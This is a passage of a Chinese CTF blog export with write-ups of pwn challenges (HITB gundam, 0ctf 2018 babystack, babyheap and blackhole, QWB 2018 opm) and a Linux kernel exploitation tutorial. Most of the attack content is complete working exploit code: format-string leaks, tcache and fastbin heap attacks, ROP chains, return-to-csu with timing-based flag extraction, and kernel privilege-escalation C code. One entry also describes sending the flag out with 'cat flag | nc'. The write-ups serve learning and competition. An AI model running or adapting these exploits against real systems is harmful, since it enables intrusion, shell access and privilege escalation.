while 1: a = raw_input() str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' else: a = tmp[0] print a#test()#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)#p.sendline(str)#def find_password():#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)#find_password(str) #i+=1'''for i in range(0,100): str = '%13$caaa' + p32(0x8040000+i*4) leak(str)'''#print '[-] count ',countstr = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak1 = u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak2 = u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak3 = u64(p.recv(6).ljust(8,'\0'))print '[*] setbuf ',hex(leak1)print '[*] usleep ',hex(leak2)print '[*] gets ',hex(leak3)libc.address = leak1 - libc.symbols['setbuf']print '[*] system ',hex(libc.symbols['system'])context.clear(arch = 'amd64')#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))target = libc.symbols['system']#str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%((target&amp;0xff),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%(((target&amp;0xff)),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 += ';/bin/sh\0;'str1 = str1.ljust(48,'a')str1 += p64(0x601028)str1 += p64(0x601029)print '[+] ',len(str1)#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) if ('\x20' in str1) | ('\x0a' in str1): print '[-]' print str1 exit(0)print str1p.sendline(str1)p.interactive()'''[*] setbuf 0x7fdcfdb2e6b0[*] usleep 0x7fdcfdbb5d60[*] gets 0x7fdcfdb26d80[*] system 0x7fdcfdafd390''' gundam此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。 1234567891011121314151617181920212223242526272829__int64 destroy()&#123; __int64 result; // rax@5 __int64 v1; // rcx@8 unsigned int v2; // [sp+4h] [bp-Ch]@3 __int64 v3; // [sp+8h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); if ( !bss_sum ) &#123; puts("No gundam");LABEL_7: result = 0LL; goto LABEL_8; &#125; printf("Which gundam do you want to Destory:"); __isoc99_scanf("%d", &amp;v2); if ( v2 &lt;= 8 &amp;&amp; bss_list[(unsigned __int64)v2] ) &#123; *(_DWORD *)bss_list[(unsigned __int64)v2] = 0; free(*(void **)(bss_list[(unsigned __int64)v2] + 8LL)); goto LABEL_7; &#125; puts("Invalid choice"); result = 0LL;LABEL_8: v1 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125; 其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在之前的博客 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。 堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。 此题选择覆写__free_hook为system，最终free拿到shell。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *debug = 0#HITB&#123;now_you_know_about_tcache&#125;if debug: p = process('./gundam') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.37.114', 9999) libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def build(name,type): p.recvuntil('choice :') p.sendline('1') p.recvuntil('The name of gundam :') p.send(name) p.recvuntil('The type of the gundam :') p.sendline(str(type))def visit(): p.recvuntil('choice :') p.sendline('2')def destroy(index): p.recvuntil('choice :') p.sendline('3') p.recvuntil('Which gundam do you want to Destory:') p.sendline(str(index))def blow(): p.recvuntil('choice :') p.sendline('4')for i in range(0,9): build('p4nda',1) for i in range(0,9): destroy(i)blow()for i in range(0,8): build('a'*8,1)build('a'*8,1)visit()p.recvuntil('Gundam[7] :aaaaaaaa')libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols['__malloc_hook']print '[*] system:',hex(libc.symbols['system'])for i in range(0,8): destroy(i)blow()build('p4nda',1) #0build('/bin/sh\0',1) #0 1build('p4nda',1) #0destroy(0)destroy(0)build(p64(libc.symbols['__free_hook']-0x10),1)# 0 1 2build('a'*0x30,1)build(p64(libc.symbols['system'])*3,1)destroy(1)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF KETNEL PWN 入门记录]]></title>
    <url>%2F2018%2F04%2F04%2Fkernel-pwn-start%2F</url>
    <content type="text"><![CDATA[从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。 最开始参考的是安全客上的两篇文章，都来自o0xmuhe Linux 内核漏洞利用教程（一）：环境配置 Linux 内核漏洞利用教程（二）：两个Demo 本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…） 环境配置编译内核文中提到的安装依赖库及qemu时，在make menuconfig就很懵… 1234567$ cd linux-2.6.32.1/$ sudo apt-get install libncurses5-dev$ sudo apt-get install qemu qemu-system$ make menuconfig$ make$ make all$ make modules 突然出现一大堆选项，而且并不知道是干嘛的… 最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的Save an Alternate Configuration File，然后选择默认命名的.config就可以了。 其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。 编译busybox在编译busybox时，需要去掉 1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统 2 Networking Utilities -&gt; [] inetd (Internet超级服务器) 配置busyboxqemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功） 首先，在busy-box的根目录下建立_install文件夹，作为文件系统 12cd _installmkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125; 在_install中的etc文件中增加inittab文件， 123456789cd etctouch inittab-----------------------This is Content---------------------------::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init 增加etc/init.d/rcS文件 123456789101112mkdir init.dcd init.dtouch rcS-----------------------This is Content---------------------------#!/bin/sh#!/bin/shmount -t proc none /procmount -t sys none /sys/bin/mount -n -t sysfs none /sys/bin/mount -t ramfs none /dev/sbin/mdev - 建立完上述文件后，可以制作img镜像了。 在_install文件夹下： 1find . | cpio -o --format=newc &gt; ../rootfs.img 启动qemu启动gdb的脚本 12345678910gdb \ -ex "add-auto-load-safe-path $(pwd)" \ -ex "file vmlinux" \ -ex 'set arch i386:x86-64:intel' \ -ex 'target remote localhost:1234' \ -ex 'break start_kernel' \ -ex 'continue' \ -ex 'disconnect' \ -ex 'set arch i386:x86-64' \ -ex 'target remote localhost:1234' 启动qemu的脚本 1qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 两个Demo编译内核驱动编译内核及利用的exp、poc时，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下。 另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile 每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。 NULL Dereference这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。 因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。 和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。 附64位的exp 123456789101112131415161718192021222324-----------------------shellcode.s -----------------xor %rax,%raxmov %rax,%rdicall 0xffffffff81081030mov %rax,%rdicall 0xffffffff81080e40ret------------------------exp.c ---------------------#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char shellcode[] = "\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3";int main()&#123; mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, shellcode, sizeof(shellcode)); int fd = open("/proc/bug1", O_WRONLY); write(fd, "muhe", 4); system("/bin/sh");//get root shell return 0;&#125; Kernel Stack Overflow这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了… 在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;unsigned long long eip,user_cs,user_eflags,user_sp,user_ss;char bin_sh[] = "/bin/sh";struct trap_frame&#123; void *eip; uint32_t cs; uint32_t eflags; void *rsp; uint32_t ss;&#125;__attribute__((packed));struct trap_frame tf;void get_shell(void)&#123; system("/bin/sh");&#125;void init_tf_work(void)&#123; unsigned long long i = 0x50; unsigned long long j = 0x78; asm( //"pushq %%ss\n" "subq %2,%%rsp\n" "movq %%ss,%%rax\n" "pushq %%rax\n" "pushq %%rsp\n" "pushfq\n" //"pushq %%cs\n" "movq %%cs,%%rax\n" "pushq %%rax\n" "pushq %0\n" "movq %%rsp,%1\n" "addq %3,%%rsp" :"=m"(eip),"=r"(user_sp),"=m"(i),"=m"(j) : :"memory" );&#125;#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff81080db0;void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81080bc0;void payload(void)&#123; //payload here commit_creds(prepare_kernel_cred(0)); asm( "movq %0,%%rsp\n" "iretq\n" :"=m"(user_sp) );&#125;int main(void)&#123; char buf[40]; memset(buf,0x41,40); eip =(unsigned long long) get_shell; *((void**)(buf+32)) = &amp;payload; //set eip to payload init_tf_work(); write(1,buf,sizeof(buf)); int fd = open("/proc/bug2",O_WRONLY); //exploit write(fd,buf,sizeof(buf)); return 0;&#125;]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>KERNEL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F04%2F04%2F0ctf2018%2F</url>
    <content type="text"><![CDATA[这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。 靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。 babystack一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。 这篇博客对这个知识点讲的很清楚 http://www.freebuf.com/articles/system/149214.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *from ctypes import *import hashlibimport stringdebug = 0elf = ELF('./babystack')#flag&#123;return_to_dlresolve_for_warming_up&#125;ct = string.ascii_letters+string.digits#context.log_level = 'debug'def login(io):# io.recvuntil("+") s = io.recvline()[:-1] #io.recvuntil("== ") #dst = io.recvuntil("\n")[:-1] print repr(s) #print repr(dst) def getpre(): for c1 in ct: for c2 in ct: for c3 in ct: for c4 in ct: pre = c1 + c2 + c3 + c4 #hasho = hashlib.sha256(s+pre) #print hasho.hexdigest() if hashlib.sha256(s + pre).digest().startswith('\0\0\0'):#hasho.hexdigest().lower().startswith('\0\0\0'): return pre pre = getpre() print pre io.send(pre)if debug: p = process('./babystack') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p =remote('202.120.7.202', 6666) #libc = ELF('./libc-2.23.so') #off = 0x001b0000 login(p) context.log_level = 'debug'bss_start = 0x804a000leave_ret = 0x8048455pppr = 0x080484e9relplt = 0x80482b0#gdb.attach(p,'b *0x80484e9')part1 = 'a'*0x28 + p32(bss_start+0x800) + p32(elf.symbols['read']) + p32(leave_ret) + p32(0) + p32(bss_start+0x800) + p32(40)print '[*] part1 ' ,len(part1)#p.send(part1)rop1 = p32(bss_start+0x800+0x200) + p32(elf.symbols['read']) + p32(pppr) + p32(0) + p32(bss_start + 0x100) +p32(44)rop1 += p32(0x80482f0) + p32(bss_start+0x100 - relplt) +p32(pppr)+ p32(0x804a124)# + p32(0) + p32(bss_start + 0x200) +p32(0x100)print '[*] part2 ' ,len(rop1)#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) #p.send(rop1)rop2 = p32(0x0804a00c)+p32(0x0001f407)+ p32(0xdeadbeef) + p32(0x1ef0) + p32(0) + p32(0) + p32(12) + 'system\0\0'rop3 = rop2 + '/bin/sh\0'print '[*] part3 ' ,len(rop3)#rop = rop3 + 'a'*(0x100-len(rop3))p.send(part1+rop1+rop3)p.interactive()'''0x080484eb : pop ebp ; ret0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080482e9 : pop ebx ; ret0x080484ea : pop edi ; pop ebp ; ret0x080484e9 : pop esi ; pop edi ; pop ebp ; ret 0x00000006 (SYMTAB) 0x80481cc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x804827cpwndbg&gt; x /4wx 0x80481cc+160x80481dc: 0x0000001a 0x00000000 0x00000000 0x00000012''' 拿到shell，发现此题没有输出… 解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了… 最后看到flag，果然这种方法就是预期解… babyheap此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是alignedhook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\_malloc_hook为one_gadget，从而拿到shell了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env python# coding=utf-8from pwn import *#flag&#123;have_fun_with_fastbin&#125;context.log_level = "DEBUG"p = remote("202.120.7.204",127)#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)def allocate(size): p.sendlineafter('Command:', '1') p.sendlineafter('Size:', str(size))def update(index, size, content): p.sendlineafter('Command:', '2') p.sendlineafter('Index:', str(index)) p.sendlineafter('Size:', str(size)) p.sendlineafter('Content:', content)def delete(index): p.sendlineafter('Command:', '3') p.sendlineafter('Index:', str(index))def view(index): p.sendlineafter('Command:', '4') p.sendlineafter('Index:', str(index))allocate(0x58) # 0allocate(0x58) # 0 1allocate(0x58) # 0 1 2 update(0, 0x59, 'a'*0x58 + '\xc1')allocate(0x20) # 0 1 2 3delete(1) # 0 2 3allocate(0x58) # 0 1 2 3view(2)p.recvuntil('Chunk[2]: ')leak_addr = u64(p.recv(6) + '\x00\x00')main_arena = leak_addr - 88print('main_arena is ' + hex(main_arena))libc = ELF('./libc-2.24.so')#('/lib/x86_64-linux-gnu/libc.so.6')libcbase = main_arena - 0x10 - libc.symbols['__malloc_hook']delete(3)allocate(0x58) # 0 1 2 3delete(3)allocate(0x58) # 0 1 2 3 (2==3)allocate(0x58) # 0 1 2 3 4allocate(0x58) # 0 1 2 3 4 5 allocate(0x38) # 0 1 2 3 4 5 6allocate(0x48) # 0 1 2 3 4 5 6 7update(4, 0x59, 'a'*0x58 + '\xf1')delete(5) # 0 1 2 3 4 6 7allocate(0x58) # 0 1 2 3 4 5 6 7allocate(0x38) # 0 1 2 3 4 5 6 7 8(6==8)delete(8) update(6, 0x8, p64(0x60))allocate(0x38)delete(3)update(2, 0x8, p64(main_arena + 0x10))allocate(0x58) # 0 1 2 3 4 5 6 7 8 allocate(0x58) # 0 1 2 3 4 5 6 7 8 9malloc_hook_head = main_arena - 0x10 - 0x10update(9, 0x58, p64(0)*7 + p64(malloc_hook_head) + p64(0) + p64(leak_addr)*2)allocate(0x40)one_gadget = libcbase + 0x3f35aupdate(10, 8, p64(one_gadget))#db.attach(p)allocate(0x10)#delete(2)#delete(3)p.interactive()'''0x3f306 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x3f35a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xd695f execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''''''0x45526 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4557a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf1651 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0xf24cb execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''' blackhole此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。 并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。 并且发现自己的汇编语言写的真是渣… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#!/usr/bin/env python# coding=utf-8from pwn import *import threadingimport stringimport random, string, subprocess, os, sysfrom hashlib import sha256os.chdir(os.path.dirname(os.path.realpath(__file__)))check_result = Falsedef check(offset, guess, method): # p = process('./blackhole') # gdb.attach(p, open('debug')) global check_result check_result = False while True: p = remote('202.120.7.203', 666) # p = remote('127.0.0.1', 5555) def pow(): chal = p.recvline()[:-1] print chal.encode('hex') for c1 in xrange(256): for c2 in xrange(256): for c3 in xrange(256): for c4 in xrange(256): sol = ''.join(map(chr, (c1, c2, c3, c4))) if sha256(chal + sol).hexdigest().startswith('00000'): p.send(sol) print sha256(chal + sol).hexdigest() return True return False if pow() == True: break output_buffer = '' context.arch = 'amd64' elf = ELF('./blackhole') # context.log_level = 'DEBUG' pop6 = 0x400A4A mov_call = 0x400A30 bss = 0x601100 pop_rbp = 0x4007c0 leave_ret = 0x4009A5 def callfunc(func, arg1, arg2, arg3): rop = p64(pop6) rop += p64(0) + p64(1) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1) rop += p64(mov_call) return rop rop = 'a'*40 rop += callfunc(elf.got['read'], 0, bss, 320) rop += p64(0)*7 rop += p64(pop_rbp) + p64(bss - 8) + p64(leave_ret) rop = rop.ljust(0x100, 'a') # p.send(rop) output_buffer += rop context.arch = 'amd64' shellcode = shellcraft.open('/home/blackhole/flag', constants.O_RDONLY) # shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY) shellcode += shellcraft.read('rax', bss, 60) shellcode += "mov al, byte ptr [%s]; cmp al, %s;" % (hex(0x601100 + offset), hex(guess)) if method == 'equal': shellcode += "jne Exit;" elif method == 'smaller': shellcode += "jl Exit;" else: shellcode += "jg Exit;" shellcode += "Loop:" shellcode += shellcraft.read(0, bss + 0x100, 0x10) # just block the program shellcode += 'jmp Loop;' shellcode += 'Exit:' + shellcraft.exit(0) shellcode = asm(shellcode) bss_rop = callfunc(elf.got['read'], 0, elf.got['alarm'], 1) bss_rop += callfunc(elf.got['read'], 0, bss, constants.SYS_mprotect) bss_rop += callfunc(elf.got['alarm'], 0x601000, 0x1000, 0x7) bss_rop += callfunc(elf.got['read'], 0, bss, len(shellcode)) bss_rop += p64(0)*7 bss_rop += p64(bss) #p.send(bss_rop) # print 'len(bss_rop) is ' + hex(len(bss_rop)) output_buffer += bss_rop # p.send('\x05' + 'a' * constants.SYS_mprotect) # output_buffer += '\x05' + 'a' * constants.SYS_mprotect output_buffer += '\x85' + 'a' * constants.SYS_mprotect output_buffer += shellcode old_time = time.time() # print len(output_buffer) p.send(output_buffer.ljust(0x800, 'f')) try: for i in xrange(5): p.sendline('hack you') print("hack you") time.sleep(1) times = i p.close() except Exception as e: times = i p.close() if times &gt; 3: check_result = True def binSearch(offset, start, end): while start &lt; end: print start, end, chr(start), chr(end) medium = (start + end) / 2 check(offset, medium, 'equal') if check_result: return medium check(offset, medium, "smaller") if check_result: start, end = medium, end else: start, end = start, medium return start flag = 'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'for i in range(len(flag), 60): result = binSearch(i, 33, 128) flag += chr(result) log.info("flag is " + flag)]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QWBCTF 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F03%2F27%2FQWB2018%2F</url>
    <content type="text"><![CDATA[opm题目分析本题逻辑比较清晰，仅有两个功能，添加成员和展示全部成员两个功能。 其中，在BSS段上维护了一个数组，用于存储成员的数据结构。该数据结构包括两个从堆上申请的数据块组成。 分别是定长为0x30（new（0x20））的节点，和由malloc（len(s)）申请的动态节点构成。 12340 8 16 24 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| function ptr | address | length | int |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 添加用户函数主要就是维护这个变量 展示全部成员就是利用function ptr来打印全部成员变量的内容。 漏洞利用此题在add_role函数中，十分明显的使用gets(s)留出了两个栈溢出漏洞，但是此题开启了全部保护，让所有地址均位置。并且gets函数有一个非常明显的弊端，会在输入的最后加入’\0’，泄露更加困难。 其实，这道题主要考察堆地址的构造，因为和堆块大小关系并不大。 堆地址泄露首先，申请一个较大的块，保证不出现溢出，这样使下一块分配地址是，输入内容部分会申请得到以00结尾的字符串。 然后，申请一个包含溢出的块，如’b’*0x80+’\x20’，如此一来，会把本来要写到节点堆块的数据向上写入，写到以0020结尾的段地址空间去，由于此题在前方已申请了大量空间，所以保证以0020为结尾的块，不会出现由于未mmap，导致的段错误。这样相当于在一个末位2字节已知的地址，写入了第二个数据结构内容部分的地址。 然后，申请一个刚好为0x80的块，如’c’*0x80，这样，gets输入的\0会覆盖要写入的地址，这样就会将地址写入到最低一字节为00的地址去，根据堆地址的构造，这个地方恰好属于第二个块的内容部分，且被’b’填充，当写入后，如果可以利用printf等函数打印出第二个块内容，就可以成功泄露堆地址了。当然，直接show一定是不行的。 最后，再次申请一个数据块，在第一部分输入内容时并不溢出而在第二个输入数字处溢出一个字节，使这个地址变成第二个块地址写入的0020结尾的地址，此题恰好保证分配过程中前6字节数据不变，在写入int后，就会执行打印操作，也就是打印第二块的内容，顺便打印出了堆地址。 1234add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20') 有了堆地址以后，相当于堆分配的全部地址均可预测。(所谓预测，就是写到每步的时候动态调一下，然后直接找当时的内存做减法) ###PIE泄露 首先，可以利用堆地址反向解析出第一块自定义的存储print函数的堆块地址，将这个写入到某堆块内容中去，而这个新申请堆块的值也是可以预测的，因此，再申请一块堆，使其溢出溢出到前一个内容块的地址-0x08处去，相当于在前一块堆上构造了一个伪造的节点，这样就可以泄露print函数的地址，也就相当于PIE地址。 libc地址泄露与PIE泄露类似，通过PIE，可以获取puts函数的got表地址，利用这个地址已经同样的泄露方法，可以获取libc的地址。 控制流劫持控制流劫持的方法与这个方法一样，同样在堆上构造一个伪造的块，其中填入one_gadget的地址，再次申请一个堆块，覆盖返回值为上一块的内容，最后调用show函数，就可以执行one_gadget了，从而拿到shell。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *from ctypes import *debug = 1elf = ELF('./opm')if debug: p = process('./opm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('39.107.33.43', 13572) context.log_level = 'debug'def add(name,punch): p.recvuntil('(E)xit\n') p.sendline('A') p.recvuntil('name:\n') p.sendline(name) p.recvuntil('punch?\n') p.sendline(str(punch))def show(): p.recvuntil('(E)xit\n') p.sendline('S') add('a'*0x78,1)add('b'*0x80+'\x20',2)add('c'*0x80,3)add('d'*0x18,'d'*0x80+'\x20')p.recvuntil('&lt;bbbbbbbb')heap_addr = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00'))print '[*] heap : ', hex(heap_addr)offset = 0x0000561b9016ec20 - 0x561b9016edc0print_addr1 = heap_addr + offsetoffset2 = 0x55f94cef9ed0 - 0x55f94cef9dc0print '[*] ptr_addr : ', hex(print_addr1)add(p64(print_addr1),'4')add('e'*10 , 'e'*0x80 + p64(heap_addr + offset2 -8))p.recvuntil('&lt;')PIE = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - 0XB30print '[*] pie : ', hex(PIE)add(p64(PIE+elf.got['puts']),'5')offset3 = 0x55f960027f70 - 0x55f960027dc0add('f'*10 , 'f'*0x80 + p64(heap_addr + offset3 -8))p.recvuntil('&lt;')libc.address = u64(p.recvuntil('&gt;')[:-1].ljust(8,'\x00')) - libc.symbols['puts']print '[*] system : ', hex(libc.symbols['system'])add(p64(libc.address + 0x4526a),'6')block_exploit = heap_addr +0x5608f0cd5010 - 0x5608f0cd4dc0add('/bin/sh\0'+'\x00'*0x78 + p64(block_exploit) ,1)gdb.attach(p)p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' note题目分析此题最开始发现是标准的socket + fork写法，这样写法通常是会爆破canary或者地址，但是note这题暂时没用上。 经AAA战队的大佬提醒，在note2题目中会用到，to becontinue… 直接来看fork之后的函数，首先就是会getpwnam(”note“)操作，调试的时候，直接新建一个这个用户就能过了.. 关键函数中，主要申请了3块内存 对于title这个变量，是有限制的，遇到0x26232722403f210a任意一个时会截断，这样截断后会在堆块末尾写入这个截断值，此时会有一个溢出（off-by-one）。 对于content变量，理论上智能改变3次，使用realloc进行扩容或者缩小。并且提供打印功能。 对于comment变量是任意写的。 漏洞利用此题比较特殊的点在于题目没有free，当没有free时，就需要创造free了… 通过阅读realloc代码，可以发现其处理逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051else &#123; /* Try to expand forward into top */ if (next == av-&gt;top &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb + MINSIZE)) &#123; ... &#125; /* Try to expand forward into next chunk; split off remainder below */ else if (next != av-&gt;top &amp;&amp; !inuse (next) &amp;&amp; (unsigned long) (newsize = oldsize + nextsize) &gt;= (unsigned long) (nb)) &#123; newp = oldp; unlink (av, next, bck, fwd); &#125; /* allocate, copy, free */ else &#123; ** newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK); if (newmem == 0) return 0; /* propagate failure */ newp = mem2chunk (newmem); newsize = chunksize (newp); /* Avoid copy if newp is next chunk after oldp. */ if (newp == next) &#123; newsize += oldsize; newp = oldp; &#125; else &#123; /* Unroll copy of &lt;= 36 bytes (72 if 8byte sizes) We know that contents have an odd number of INTERNAL_SIZE_T-sized words; minimally 3. */ ...... ** _int_free (av, oldp, 1); check_inuse_chunk (av, newp); return chunk2mem (newp); &#125; 在标**的行发现，realloc当想要拓展当前块的时候，会检查下一块释放被占用，如果被占用，则会利用int_malloc函数申请一个新的堆块，并且释放原来占用的堆块。 